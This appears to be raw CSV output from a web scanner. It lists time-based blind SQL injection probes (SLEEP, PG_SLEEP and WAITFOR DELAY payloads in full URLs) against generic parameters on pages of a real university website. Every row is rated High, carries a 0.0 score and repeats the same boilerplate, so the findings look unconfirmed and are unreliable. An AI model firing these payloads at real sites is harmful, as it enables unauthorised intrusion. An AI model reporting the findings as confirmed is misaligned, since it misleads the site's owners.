Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/pharmacy/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/pharmacy/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/pharmacy/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/pharmacy/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/pharmacy/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/pharmacy/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/pharmacy/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
